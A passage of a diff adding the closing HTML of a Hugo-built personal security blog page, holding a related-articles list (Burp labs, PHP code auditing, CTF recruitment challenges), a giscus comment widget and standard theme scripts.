+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under Calendar</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/posts/burp%E9%9D%B6%E5%9C%BA-server-side/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Burp靶场：Server-side vulnerabilities</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-php/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">代码审计-PHP</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/posts/%E5%BE%A1%E6%9E%97-devops%E5%85%A5%E9%97%A8%E5%B0%8F%E7%BB%93/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://raw.githubusercontent.com/calendar0917/images/master/20251021193711745.png" loading="lazy" data-key="" data-hash="https://raw.githubusercontent.com/calendar0917/images/master/20251021193711745.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">御林-DevOps入门小结</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/posts/%E5%BE%A1%E6%9E%97-agent%E4%B8%93%E9%A2%98/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">御林招新题：Agent 专题</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/posts/%E5%BE%A1%E6%9E%97-homepage/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://raw.githubusercontent.com/calendar0917/images/master/20251020172907999.png" loading="lazy" data-key="" data-hash="https://raw.githubusercontent.com/calendar0917/images/master/20251020172907999.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">御林招新题：Homepage</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script
+    src="https://giscus.app/client.js"
+    data-repo="calendar0917/calendar0917.github.io"
+    data-repo-id="R_kgDOPxiY_A"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOPxiY_M4Cwwbp"
+    data-mapping="url"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="preferred_color_scheme"
+    data-lang="en"
+    data-loading=""
+    crossorigin="anonymous"
+    async
+></script>
+<script>
+    function setGiscusTheme(theme) {
+        let giscus = document.querySelector("iframe.giscus-frame");
+        if (giscus) {
+            giscus.contentWindow.postMessage(
+                {
+                    giscus: {
+                        setConfig: {
+                            theme: theme,
+                        },
+                    },
+                },
+                "https://giscus.app"
+            );
+        }
+    }
+
+    (function () {
+        addEventListener("message", (e) => {
+            if (event.origin !== "https://giscus.app") return;
+            handler();
+        });
+        window.addEventListener("onColorSchemeChange", handler);
+
+        function handler() {
+            if (document.documentElement.dataset.scheme === "light") {
+                setGiscusTheme('preferred_color_scheme');
+            } else {
+                setGiscusTheme('preferred_color_scheme');
+            }
+        }
+    })();
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Calendar
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.31.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+    #backTopBtn {
+        display: none;
+        position: fixed;
+        bottom: 30px;
+        z-index: 99;
+        cursor: pointer;
+        width: 30px;
+        height: 30px;
+        background-image: url(https://calendar0917.github.io/icons/backTop.svg);
+    }
+</style>
+
+<script>
+    
+
+    function initScrollTop() {
+        let rightSideBar = document.querySelector(".right-sidebar");
+        if (!rightSideBar) {
+            return;
+        }
+        
+        let btn = document.createElement("div");
+        btn.id = "backTopBtn";
+        btn.onclick = backToTop
+        rightSideBar.appendChild(btn)
+        
+        window.onscroll = function() {
+            
+            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                btn.style.display = "block";
+            } else {
+                btn.style.display = "none";
+            }
+        };
+    }
+
+    
+
+    function backToTop(){
+        window.scrollTo({ top: 0, behavior: "smooth" })
+    }
+
+    initScrollTop();
+</script>
+
+    </body>
+</html>
